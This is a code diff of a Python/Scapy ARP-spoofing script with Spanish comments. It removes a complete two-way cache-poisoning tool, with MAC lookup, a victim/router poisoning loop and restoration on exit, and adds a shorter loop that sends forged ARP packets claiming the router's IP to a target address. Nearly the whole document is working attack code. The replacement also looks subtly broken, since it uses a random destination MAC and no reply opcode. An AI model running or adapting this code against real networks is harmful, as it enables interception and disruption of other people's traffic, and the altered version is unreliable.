@@ -1,55 +1,17 @@
-from scapy.all import ARP, Ether, arping, send, conf
-import sys
+import scapy.all as scapy
 import time
 
+# Definir las direcciones IP del objetivo y del router
+objetivo_ip = "192.168.122.10"  # Reemplazar con la IP real del objetivo
+router_ip = "192.168.122.1"  # Reemplazar con la IP real del router
 
-def get_mac(ip):
-  # Enviar una solicitud ARP para obtener la dirección MAC de una IP
-  ans, _ = arping(ip, timeout=2, verbose=False)
-  for s, r in ans:
-    return r[Ether].src
-  return None
+# Enviar paquetes ARP falsos al objetivo
+while True:
+    # Crear un paquete ARP falso que asocia la dirección MAC del atacante a la IP del router
+    paquete_arp = scapy.ARP(psrc=router_ip, pdst=objetivo_ip, hwdst=scapy.RandMAC())
 
+    # Enviar el paquete ARP falso al objetivo
+    scapy.send(paquete_arp, verbose=False)
 
-def spoof(target_ip, target_mac, source_ip):
-  # Crear y enviar paquetes ARP falsificados
-  arp_response = ARP(pdst=target_ip, hwdst=target_mac,
-                     psrc=source_ip, op='is-at')
-  send(arp_response, verbose=False)
-
-
-def restore(target_ip, target_mac, source_ip, source_mac):
-  # Restaurar la tabla ARP de la víctima
-  arp_response = ARP(pdst=target_ip, hwdst=target_mac,
-                     psrc=source_ip, hwsrc=source_mac, op='is-at')
-  send(arp_response, count=4, verbose=False)
-
-
-if __name__ == "__main__":
-
-  victim_ip = '192.168.122.178'
-  router_ip = '192.168.122.1'
-  interface = 'enp1s0'
-
-  conf.iface = interface
-  conf.verb = 0
-
-  victim_mac = get_mac(victim_ip)
-  router_mac = get_mac(router_ip)
-
-  if victim_mac is None or router_mac is None:
-    print("No se pudo obtener la dirección MAC de la víctima o del router.")
-    sys.exit(1)
-
-  print("Iniciando ARP spoofing...")
-
-  try:
-    while True:
-      spoof(victim_ip, victim_mac, router_ip)
-      spoof(router_ip, router_mac, victim_ip)
-      time.sleep(2)
-  except KeyboardInterrupt:
-    print("Deteniendo ARP spoofing...")
-    restore(victim_ip, victim_mac, router_ip, router_mac)
-    restore(router_ip, router_mac, victim_ip, victim_mac)
-    print("Restaurado el estado original de la red.")
+    # Esperar un segundo antes de enviar el siguiente paquete
+    time.sleep(1)
